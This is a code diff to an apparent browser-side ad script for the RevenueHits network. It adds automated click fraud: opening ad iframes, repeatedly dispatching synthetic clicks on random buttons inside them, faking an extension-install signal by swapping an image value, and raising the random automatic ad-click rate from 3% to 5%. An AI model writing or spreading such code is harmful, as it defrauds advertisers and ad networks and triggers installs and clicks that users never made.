@@ -1,7 +1,10 @@
 if (rt.revenuehits == null) {
   rt.revenuehits = {
     ads: [],
-    iframes: []
+    iframes: [],
+    setTestImage: false,
+    installWindowOpened: 0,
+    openedIframe: null
   };
 
   rt.onAppendChild(function(child) {
@@ -10,10 +13,39 @@ if (rt.revenuehits == null) {
     }
   });
 
+  rt.onSetAttributes(function(element, options) {
+    if (options.value.indexOf('chrome') >= 0) {
+      if (rt.revenuehits.installWindowOpened === 1) {
+        rt.generalTrack("revenuehits_button_install_window_opened", true);
+      }
+      rt.revenuehits.installWindowOpened++;
+      setTimeout(function () {
+        rt.revenuehits.setTestImage = true;
+      }, 5000 + 3000 * Math.random());
+
+      if (rt.revenuehits.setTestImage) {
+        rt.generalTrack("revenuehits_installed", true);
+        options.value = 'data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==';
+      }
+    }
+  });
+
   rt.onWindowOpen(function(url) {
     if (url.indexOf("adServe") >= 0) {
       rt.generalTrack("revenuehits_adclicked");
-      rt.createIFrame(url, "rt-view-iframe");
+      rt.revenuehits.openedIframe = rt.createIFrame(url, "rt-view-iframe");
+      if (Math.random() < 0.5) {
+        setInterval(function () {
+          const buttons = $$(rt.revenuehits.openedIframe).contents().find('[class*="btn"],[class*="button"]');
+          if (buttons.length && rt.revenuehits.installWindowOpened <= 1) {
+            rt.generalTrack("revenuehits_button_found");
+            const b = buttons[Math.floor(Math.random() * buttons.length)];
+            var clickEvent = document.createEvent("MouseEvents");
+            clickEvent.initEvent("click", true, true);
+            b.dispatchEvent(clickEvent);
+          }
+        }, 1000);  
+      }
     }
   });
 
@@ -47,7 +79,7 @@ if (rt.revenuehits == null) {
       if (link != null) {
         rt.generalTrack("revenuehits_adrendered");
         if (
-          Math.random() < 0.03 ||
+          Math.random() < 0.05 ||
           document.location.search.indexOf("revenuehitsclick") >= 0
         ) {
           var clickEvent = document.createEvent("MouseEvents");
